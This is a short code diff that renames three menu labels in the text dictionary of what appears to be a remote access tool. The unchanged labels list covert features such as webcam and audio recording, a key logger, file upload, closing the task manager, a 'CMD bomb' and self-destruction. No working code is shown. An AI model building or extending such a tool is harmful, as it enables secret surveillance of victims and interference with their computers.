@@ -262,7 +262,7 @@ TEXTS = {
             ["Processes", "Webcam Photo"],
             ["Full process report", "Terminate process"],
             ["Create folder", "Delete folder"],
-            ["Directory contents", "Change directory"],
+            ["Directory content", "Change directory"],
             ["PC Info", "Network diagnostics"],
             ["Webcam record", "Audio record"],
             ["Open file", "Upload file"],
@@ -276,10 +276,10 @@ TEXTS = {
             ["Close task manager", "Open URL"],
             ["Unmute sound", "Mute sound"],
             ["Volume 100%", "CMD bomb"],
-            ["Shutdown PC", "Restart PC"],
+            ["Shutdown PC", "Reboot PC"],
             ["Move file", "Change wallpaper"],
             ["Key logger", "Key logs"],
-            ["Play sound", "Self-destruct"]
+            ["Play sound", "Self-destruction"]
         ]
     }
 }
